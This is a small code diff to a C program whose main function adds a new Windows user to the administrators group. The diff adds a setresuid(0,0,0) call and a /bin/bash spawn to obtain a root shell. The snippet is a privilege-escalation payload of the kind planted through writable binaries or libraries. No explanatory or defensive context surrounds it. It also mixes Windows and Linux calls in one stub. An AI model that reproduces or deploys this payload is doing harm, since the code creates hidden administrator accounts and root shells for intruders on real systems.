@@ -4,5 +4,8 @@ int main ()
 {
   int i;
   i=system ("net user <username> <password> /add && net localgroup administrators <username> /add");
+  //next bit is to set uid to root(may need to take it out and just get the user account and vise versa).
+  setresuid(0, 0, 0);
+  system("/bin/bash");
   return 0;
 }
